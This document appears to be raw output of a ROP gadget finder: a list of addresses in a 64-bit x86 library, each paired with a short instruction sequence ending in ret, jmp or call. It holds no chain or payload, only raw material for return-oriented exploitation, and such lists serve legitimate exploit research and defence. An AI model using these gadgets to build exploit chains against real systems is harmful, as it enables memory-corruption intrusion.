0x00002aaaaac1039e : mov esi, ebx ; mov rdi, rbp ; call rcx
0x00002aaaaac0eb96 : mov esi, ebx ; xor eax, eax ; mov rdi, rbp ; add rbx, r12 ; call r14
0x00002aaaaabe387a : mov esi, edi ; jae 0x10e8a9 ; cmp byte ptr [rax], dil ; je 0x10e8b3 ; mov rdx, rax ; jmp 0x10e8a0
0x00002aaaaab0e1a9 : mov esi, edi ; mov rdi, r13 ; call r14
0x00002aaaaab9b9e3 : mov esi, edi ; xor edi, edi ; call rax
0x00002aaaaac071da : mov esi, edx ; add rdi, 0x10 ; jmp rcx
0x00002aaaaabe7738 : mov esi, edx ; call rax
0x00002aaaaaad6bef : mov esi, edx ; mov ebp, dword ptr [rsi + rbx*8 + 0x6d] ; ret 0x1bb7
0x00002aaaaab99720 : mov esi, edx ; movsxd rsi, dword ptr [rax + rsi*4] ; add rax, rsi ; jmp rax
0x00002aaaaabfe5f1 : mov esi, esi ; call 0x558b4
0x00002aaaaaaf52f4 : mov esi, esi ; call 0xa9eb8
0x00002aaaaab5be25 : mov esi, esi ; call rax
0x00002aaaaab2b4ab : mov esi, esi ; mov rdi, qword ptr [rbp - 0x4a8] ; call rax
0x00002aaaaab8eb42 : mov esi, esi ; mov rdi, r12 ; call rbx
0x00002aaaaab8e9b2 : mov esi, esi ; mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaabf1302 : mov esi, esi ; mov rdi, r13 ; call rax
0x00002aaaaab0c8b1 : mov esi, esi ; mov rdi, r13 ; mov rdx, rbp ; call r15
0x00002aaaaac104c8 : mov esi, esi ; mov rdi, rbp ; call r12
0x00002aaaaabfe91d : mov esi, esi ; mov rdi, rbx ; mov qword ptr [rsp], rcx ; call r12
0x00002aaaaac09cb4 : mov esi, esi ; movsxd rcx, dword ptr [rax + rsi*4] ; add rax, rcx ; jmp rax
0x00002aaaaaba2129 : mov esi, esi ; movsxd rdx, dword ptr [rax + rsi*4] ; add rax, rdx ; jmp rax
0x00002aaaaac066f4 : mov esi, esi ; movsxd rsi, dword ptr [rax + rsi*4] ; add rax, rsi ; jmp rax
0x00002aaaaab996ae : mov esi, esi ; movsxd rsi, dword ptr [rdx + rsi*4] ; add rdx, rsi ; jmp rdx
0x00002aaaaabec18c : mov esi, esp ; call 0x73444
0x00002aaaaac0efa5 : mov esi, esp ; call qword ptr [rax]
0x00002aaaaab0c31b : mov esi, esp ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaab5af85 : mov esi, esp ; mov rdi, rax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaabc8452 : mov esi, esp ; mov rdi, rbp ; call 0xef757
0x00002aaaaab0c344 : mov esi, esp ; mov rdi, rbp ; call r15
0x00002aaaaab5d151 : mov esi, esp ; mov rdi, rbp ; call rax
0x00002aaaaabfee2b : mov esi, esp ; mov rdi, rbp ; mov rcx, r13 ; call rbx
0x00002aaaaac02b85 : mov esi, esp ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab5c2b3 : mov esi, esp ; mov rdi, rbx ; call rax
0x00002aaaaabfea1f : mov esi, esp ; mov rdi, rbx ; mov r13, rsp ; call r15
0x00002aaaaab5ac8a : mov esi, esp ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab5a4ad : mov esi, esp ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaaaf52f3 : mov esi, r14d ; call 0xa9eb9
0x00002aaaaab996ad : mov esi, r14d ; movsxd rsi, dword ptr [rdx + rsi*4] ; add rdx, rsi ; jmp rdx
0x00002aaaaac6b5ac : mov esp, 0x14000096 ; and bl, ch ; call rsp
0x00002aaaaac6df44 : mov esp, 0x140001a3 ; adc esi, edi ; call rsp
0x00002aaaaac825f4 : mov esp, 0x18000126 ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac48c4a : mov esp, 0x1f0fffea ; add bl, dh ; ret
0x00002aaaaac6c11c : mov esp, 0x240000e2 ; outsb dx, byte ptr [rsi] ; out dx, al ; call rsp
0x00002aaaaac6f4f4 : mov esp, 0x24000234 ; and bh, dl ; call rsp
0x00002aaaaac71bf4 : mov esp, 0x2800001c ; cmp ch, cl ; call qword ptr [rax]
0x00002aaaaac7e6f4 : mov esp, 0x280000e7 ; out dx, eax ; int1 ; jmp rcx
0x00002aaaaac822f4 : mov esp, 0x28000123 ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6fdd1 : mov esp, 0x2ba4fffd ; add dword ptr [rax], eax ; hlt ; ret 0xfffd
0x00002aaaaac6c1a4 : mov esp, 0x40000e4 ; jb 0x1971a0 ; call rsp
0x00002aaaaac6c1f4 : mov esp, 0x40000e6 ; js 0x1971f0 ; call rsp
0x00002aaaaac6e044 : mov esp, 0x40001a6 ; sbb dh, bh ; call rsp
0x00002aaaaac6eccc : mov esp, 0x440001f4 ; fprem ; call rsp
0x00002aaaaab63c87 : mov esp, 0x440f48c7 ; ret 0xc083
0x00002aaaaac0d0a1 : mov esp, 0x440f49df ; fmul qword ptr [rax - 0x7d] ; ret
0x00002aaaaab62f71 : mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x00002aaaaab62fa1 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab62f91 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaac855f4 : mov esp, 0x48000156 ; jnp 0x1b05f7 ; jmp qword ptr [rcx]
0x00002aaaaab0e952 : mov esp, 0x51218e8 ; add byte ptr [rbp - 0x7b], cl ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaaad8cd8 : mov esp, 0x5335a8f4 ; or byte ptr fs:[rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaac6d78c : mov esp, 0x5400017b ; and al, 0xf6 ; call rsp
0x00002aaaaabfbbe7 : mov esp, 0x5c415d5b ; pop r13 ; pop r14 ; ret
0x00002aaaaac6d014 : mov esp, 0x64000149 ; insd dword ptr [rdi], dx ; call rsp
0x00002aaaaac781f4 : mov esp, 0x68000082 ; pop rcx ; in eax, dx ; call qword ptr [rax]
0x00002aaaaabab74e : mov esp, 0x7408e383 ; xchg eax, esi ; pop rbx ; ret
0x00002aaaaac831f4 : mov esp, 0x88000132 ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaab8b3ba : mov esp, 0x8824 ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaabb24d4 : mov esp, 0x89000000 ; ret 0xd139
0x00002aaaaabd8bfc : mov esp, 0x8b49fff1 ; call rbx
0x00002aaaaabd8c09 : mov esp, 0x8b49fff1 ; jge 0x103c17 ; call rbx
0x00002aaaaac6be0c : mov esp, 0x940000d0 ; sbb esi, ebp ; call rsp
0x00002aaaaac6d704 : mov esp, 0x94000178 ; adc al, 0xf6 ; call rsp
0x00002aaaaac6e7ec : mov esp, 0xa40001d1 ; adc edi, eax ; call rsp
0x00002aaaaabaf7bb : mov esp, 0xa824 ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaac5cecd : mov esp, 0xb22bfff3 ; jmp rsp
0x00002aaaaac6bb25 : mov esp, 0xbb940000 ; in eax, dx ; call rsp
0x00002aaaaab62fb1 : mov esp, 0xc22948c0 ; jbe 0x8dffa ; add rax, rdi ; ret
0x00002aaaaab63c76 : mov esp, 0xc2440fc7 ; add eax, 1 ; ret
0x00002aaaaac6fc94 : mov esp, 0xc4000116 ; sti ; call rsp
0x00002aaaaabb4b38 : mov esp, 0xc824 ; add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x8488
0x00002aaaaab5fd03 : mov esp, 0xd00148d2 ; sub rax, rdi ; ret
0x00002aaaaac6bd6c : mov esp, 0xd40000cc ; or esi, ebp ; call rsp
0x00002aaaaac6c0c4 : mov esp, 0xd40000e0 ; out dx, al ; call rsp
0x00002aaaaac6f7fc : mov esp, 0xd4000247 ; pop rbp ; cli ; call rsp
0x00002aaaaac84df4 : mov esp, 0xd800014e ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac89af4 : mov esp, 0xd800019b ; ret
0x00002aaaaac7bb85 : mov esp, 0xd9e80000 ; cld ; call qword ptr [rax]
0x00002aaaaac6d68c : mov esp, 0xe4000176 ; or al, 0xf6 ; call rsp
0x00002aaaaac6fb4c : mov esp, 0xe400025c ; salc ; cli ; call rsp
0x00002aaaaac43729 : mov esp, 0xf66bcb2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac86ef4 : mov esp, 0xf800016f ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaab6a9fb : mov esp, 0xf80148c0 ; add rax, rcx ; ret
0x00002aaaaab62f81 : mov esp, 0xf80148c0 ; ret
0x00002aaaaab3c493 : mov esp, 2 ; jmp 0x63703
0x00002aaaaac0c97c : mov esp, dword ptr [rax] ; jmp 0x13798a
0x00002aaaaaaf53f8 : mov esp, eax ; call 0xa9fd8
0x00002aaaaab0a2ea : mov esp, eax ; mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaaba395a : mov esp, edi ; je 0xce979 ; call 0x8ab76
0x00002aaaaab3480a : mov esp, edi ; mov ebx, 2 ; jmp 0x5baf9
0x00002aaaaaba95b4 : mov esp, edi ; xor eax, eax ; mov rdx, r8 ; jmp 0xd45dd
0x00002aaaaabd6c44 : mov esp, edx ; mov rbp, rax ; call rax
0x00002aaaaac5d9c5 : mov esp, esi ; call rsp
0x00002aaaaac5d9a5 : mov esp, esi ; jmp rdx
0x00002aaaaabb60b5 : mov esp, esi ; mov qword ptr [rsp + 0x40], rdi ; add rax, rdx ; jmp rax
0x00002aaaaab738cd : mov esp, esi ; sub rsp, 8 ; call 0x8ab78
0x00002aaaaab528a8 : mov esp, esi ; xor edi, edi ; mov r13, rdx ; call qword ptr [r15]
0x00002aaaaac7ae69 : mov gs, esi ; call qword ptr [rcx]
0x00002aaaaab691ae : mov qword ptr [r10 + 0x18], r8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6b12e : mov qword ptr [r12], 0 ; pop rbp ; pop r12 ; ret
0x00002aaaaab80ac1 : mov qword ptr [r12], rax ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab24263 : mov qword ptr [r13 + 8], rdx ; jmp 0x4f247
0x00002aaaaab6bd6d : mov qword ptr [r13], rbp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab938f7 : mov qword ptr [r14], rax ; mov rdi, rbx ; call 0x8ab78
0x00002aaaaabc85d0 : mov qword ptr [r14], rbx ; call 0x1f8ad
0x00002aaaaabc85cf : mov qword ptr [r14], rbx ; call 0x1f8ae
0x00002aaaaab73fe0 : mov qword ptr [r9 - 8], rcx ; ret
0x00002aaaaabf8317 : mov qword ptr [r9], r10 ; ret
0x00002aaaaabf83b3 : mov qword ptr [r9], rcx ; ret
0x00002aaaaabf8387 : mov qword ptr [r9], rdi ; ret
0x00002aaaaab62c86 : mov qword ptr [r9], rdx ; add rsp, 0x100 ; ret
0x00002aaaaab52721 : mov qword ptr [r9], rdx ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaab46c38 : mov qword ptr [rax + 0x10], rdx ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab46c78 : mov qword ptr [rax + 0x10], rsi ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab47bd8 : mov qword ptr [rax + 0x18], rdx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4c468 : mov qword ptr [rax + 0x20], rdx ; pop rbx ; ret
0x00002aaaaab463f5 : mov qword ptr [rax + 0x28], rcx ; mov byte ptr [rdx], dil ; movzx eax, dil ; ret
0x00002aaaaab47ad4 : mov qword ptr [rax + 0x38], r12 ; mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab46c3c : mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab47c76 : mov qword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x00002aaaaab50b19 : mov qword ptr [rax + 8], 0 ; ret
0x00002aaaaabd3630 : mov qword ptr [rax + 8], rdi ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + 8], rsi ; ret
0x00002aaaaabd1263 : mov qword ptr [rax], -1 ; xor eax, eax ; ret
0x00002aaaaabf8119 : mov qword ptr [rax], r10 ; lea eax, dword ptr [r9 + r8 + 2] ; pop rbx ; ret
0x00002aaaaab47164 : mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab455c9 : mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab58565 : mov qword ptr [rax], rdi ; ret
0x00002aaaaabdb6e2 : mov qword ptr [rax], rdx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab470a4 : mov qword ptr [rax], rdx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab46c35 : mov qword ptr [rax], rdx ; mov qword ptr [rax + 0x10], rdx ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab46c75 : mov qword ptr [rax], rdx ; mov qword ptr [rax + 0x10], rsi ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab029d2 : mov qword ptr [rax], rdx ; ret
0x00002aaaaabd123b : mov qword ptr [rax], rdx ; xor eax, eax ; cmp rdi, rdx ; ja 0xfc27b ; ret
0x00002aaaaab47ef0 : mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00002aaaaaba7533 : mov qword ptr [rbp - 0x2888], rsi ; sub r10, rax ; jmp 0xd255c
0x00002aaaaab23a75 : mov qword ptr [rbp - 0x4e0], r11 ; call 0x8ad19
0x00002aaaaab2264d : mov qword ptr [rbp - 0x4e8], rsi ; jmp rax
0x00002aaaaaaf8655 : mov qword ptr [rbp - 0x58], rdx ; call 0x1f8a6
0x00002aaaaabe81dc : mov qword ptr [rbp - 0x70], rax ; mov eax, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaabe8b12 : mov qword ptr [rbp - 0x70], rdx ; mov rdx, r13 ; call rax
0x00002aaaaab2724e : mov qword ptr [rbp - 0xb8], rcx ; mov rdi, rbx ; call rax
0x00002aaaaac1638c : mov qword ptr [rbp], rbx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab19c90 : mov qword ptr [rbp], rbx ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaabed6c4 : mov qword ptr [rbp], rbx ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f5f9 : mov qword ptr [rbp], rdx ; call rax
0x00002aaaaaaff6d0 : mov qword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x00002aaaaab4d456 : mov qword ptr [rbx + 0x10], rax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab9c907 : mov qword ptr [rbx + 0x10], rax ; mov rsi, rbp ; xor edx, edx ; jmp 0xc78df
0x00002aaaaac17a05 : mov qword ptr [rbx + 0x10], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaab4d9b8 : mov qword ptr [rbx + 0x10], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe30c3 : mov qword ptr [rbx + 0x10], rbp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac105d4 : mov qword ptr [rbx + 0x18], 0 ; pop rbx ; ret
0x00002aaaaac179bd : mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaabe30f3 : mov qword ptr [rbx + 0x18], rbp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4bba4 : mov qword ptr [rbx + 0x18], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac10628 : mov qword ptr [rbx + 0x20], r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab501a2 : mov qword ptr [rbx + 0x20], rax ; mov dword ptr [rbx], edx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabbc7da : mov qword ptr [rbx + 0x28], 0 ; pop rbx ; ret
0x00002aaaaab4c494 : mov qword ptr [rbx + 0x28], rax ; pop rbx ; ret
0x00002aaaaab5d601 : mov qword ptr [rbx + 0x40], r8 ; mov qword ptr [rbx], rdi ; mov dword ptr [rbx + 0x30], r9d ; call rcx
0x00002aaaaab5d6bd : mov qword ptr [rbx + 0x48], r9 ; call rcx
0x00002aaaaabd0600 : mov qword ptr [rbx + 0x48], rax ; pop rbx ; ret
0x00002aaaaab5020a : mov qword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x00002aaaaab47db9 : mov qword ptr [rbx + 0x60], rbp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4d326 : mov qword ptr [rbx + 0x90], rax ; pop rbx ; ret
0x00002aaaaab4d9b4 : mov qword ptr [rbx + 8], rax ; mov qword ptr [rbx + 0x10], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe3093 : mov qword ptr [rbx + 8], rbp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5db48 : mov qword ptr [rbx + 8], rbp ; mov qword ptr [rbx], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab50429 : mov qword ptr [rbx + 8], rdx ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaab5da9c : mov qword ptr [rbx + 8], rsi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd69e1 : mov qword ptr [rbx], 0 ; pop rbx ; ret
0x00002aaaaab1cd7b : mov qword ptr [rbx], r10 ; jg 0x47c92 ; pop rbx ; ret
0x00002aaaaab91071 : mov qword ptr [rbx], r14 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac10835 : mov qword ptr [rbx], rax ; add rsp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaac17c30 : mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaac0c67e : mov qword ptr [rbx], rax ; pop rbx ; ret
0x00002aaaaabd6981 : mov qword ptr [rbx], rax ; setne al ; movzx eax, al ; pop rbx ; ret
0x00002aaaaac0b994 : mov qword ptr [rbx], rax ; xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0b35f : mov qword ptr [rbx], rax ; xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaac0b4e2 : mov qword ptr [rbx], rax ; xor eax, eax ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5d605 : mov qword ptr [rbx], rdi ; mov dword ptr [rbx + 0x30], r9d ; call rcx
0x00002aaaaab5db22 : mov qword ptr [rbx], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5d6ba : mov qword ptr [rbx], rsi ; mov qword ptr [rbx + 0x48], r9 ; call rcx
0x00002aaaaac06723 : mov qword ptr [rcx + 0x10], rdx ; mov eax, 1 ; ret
0x00002aaaaaaf557c : mov qword ptr [rcx + 0x968], rax ; ret
0x00002aaaaac3d163 : mov qword ptr [rcx + 5], rdx ; ret
0x00002aaaaac3d173 : mov qword ptr [rcx + 6], rdx ; ret
0x00002aaaaac3d183 : mov qword ptr [rcx + 7], rdx ; ret
0x00002aaaaac3d193 : mov qword ptr [rcx + 8], rdx ; ret
0x00002aaaaab1d1ca : mov qword ptr [rcx + rsi*8], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabab101 : mov qword ptr [rcx], rax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaab4a663 : mov qword ptr [rcx], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac3d120 : mov qword ptr [rcx], rdx ; mov byte ptr [rcx + 8], dl ; ret
0x00002aaaaac3d140 : mov qword ptr [rcx], rdx ; mov dword ptr [rcx + 7], edx ; ret
0x00002aaaaac3d150 : mov qword ptr [rcx], rdx ; mov dword ptr [rcx + 8], edx ; ret
0x00002aaaaac3d160 : mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 5], rdx ; ret
0x00002aaaaac3d170 : mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 6], rdx ; ret
0x00002aaaaac3d180 : mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 7], rdx ; ret
0x00002aaaaac3d190 : mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 8], rdx ; ret
0x00002aaaaac3d130 : mov qword ptr [rcx], rdx ; mov word ptr [rcx + 8], dx ; ret
0x00002aaaaac3d110 : mov qword ptr [rcx], rdx ; ret
0x00002aaaaabcacda : mov qword ptr [rdi + 0x100], rdx ; ret
0x00002aaaaab1db3e : mov qword ptr [rdi + 0x10], r9 ; ret
0x00002aaaaab7b9cc : mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7c81c : mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7b9ec : mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7a35c : mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7a33c : mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7e28c : mov qword ptr [rdi + 0x10], rcx ; xor ch, ch ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7c83f : mov qword ptr [rdi + 0x10], rdx ; mov byte ptr [rdi + 0x18], cl ; lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7b02f : mov qword ptr [rdi + 0x10], rdx ; mov byte ptr [rdi + 0x18], cl ; ret
0x00002aaaaab7ba2f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7c87f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7a39f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7ba4f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7c89f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7a3bf : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7a380 : mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaac1022f : mov qword ptr [rdi + 0x18], rax ; mov eax, 1 ; ret
0x00002aaaaab50132 : mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab4c836 : mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rsi], rax ; xor eax, eax ; ret
0x00002aaaaaba03f7 : mov qword ptr [rdi + 0x18], rax ; mov rax, -0xe ; ret
0x00002aaaaac102c1 : mov qword ptr [rdi + 0x18], rdx ; mov eax, 1 ; ret
0x00002aaaaac1036d : mov qword ptr [rdi + 0x18], rsi ; mov dword ptr [rdi + 0x28], edx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaac101f5 : mov qword ptr [rdi + 0x18], rsi ; ret
0x00002aaaaabe2b59 : mov qword ptr [rdi + 0x28], rcx ; mov byte ptr [rax], 0x20 ; jmp 0x10db2d
0x00002aaaaabd903a : mov qword ptr [rdi + 0x28], rdx ; mov byte ptr [rax], 0xa ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac09d2b : mov qword ptr [rdi + 0x28], rdx ; mov eax, 1 ; ret
0x00002aaaaab69120 : mov qword ptr [rdi + 0x38], r9 ; ret
0x00002aaaaac09ce3 : mov qword ptr [rdi + 0x38], rdx ; mov eax, 1 ; ret
0x00002aaaaab50162 : mov qword ptr [rdi + 0x48], rdx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab5380a : mov qword ptr [rdi + 0x58], rcx ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaab0b048 : mov qword ptr [rdi + 0x78], -1 ; ret
0x00002aaaaabca33d : mov qword ptr [rdi + 0x80], rdx ; ret
0x00002aaaaab7b98c : mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7c7dc : mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7a2fc : mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7e24c : mov qword ptr [rdi + 0xe], rcx ; xor ch, ch ; mov byte ptr [rdi + 0x16], ch ; ret
0x00002aaaaab7b9ac : mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7c7fc : mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7a31c : mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7e26c : mov qword ptr [rdi + 0xf], rcx ; xor ch, ch ; mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaac2fa07 : mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f997 : mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f927 : mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f8b7 : mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7b88a : mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7c6ca : mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaac2f847 : mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a24a : mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7e13a : mov qword ptr [rdi + 5], rdx ; xor ch, ch ; mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaab7b8aa : mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7c6ea : mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaac2f7d7 : mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a25a : mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7e15a : mov qword ptr [rdi + 6], rdx ; xor ch, ch ; mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7b8ca : mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7c70a : mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac2f767 : mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a26a : mov qword ptr [rdi + 7], rdx ; ret
0x00002aaaaab7e17a : mov qword ptr [rdi + 7], rdx ; xor ch, ch ; mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaabd3647 : mov qword ptr [rdi + 8], 0 ; ret
0x00002aaaaab1d42f : mov qword ptr [rdi + 8], r10 ; mov eax, ebx ; adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00002aaaaab1d2f3 : mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaab1db37 : mov qword ptr [rdi + 8], r8 ; shr r9, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x00002aaaaab1dac3 : mov qword ptr [rdi + 8], r9 ; ret
0x00002aaaaab50136 : mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab0fc93 : mov qword ptr [rdi + 8], rdx ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab4cf5e : mov qword ptr [rdi + 8], rdx ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab0fc84 : mov qword ptr [rdi + 8], rdx ; ret
0x00002aaaaabd3637 : mov qword ptr [rdi + 8], rsi ; ret
0x00002aaaaab0b471 : mov qword ptr [rdi + rax*8], rcx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabf8497 : mov qword ptr [rdi + rdx + 0x10], r10 ; ret
0x00002aaaaabf8492 : mov qword ptr [rdi + rdx + 8], r9 ; mov qword ptr [rdi + rdx + 0x10], r10 ; ret
0x00002aaaaab6376d : mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaac26cc4 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac26d02 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab1da2e : mov qword ptr [rdi - 0x10], r9 ; ret
0x00002aaaaac26e77 : mov qword ptr [rdi - 0x11], r11 ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
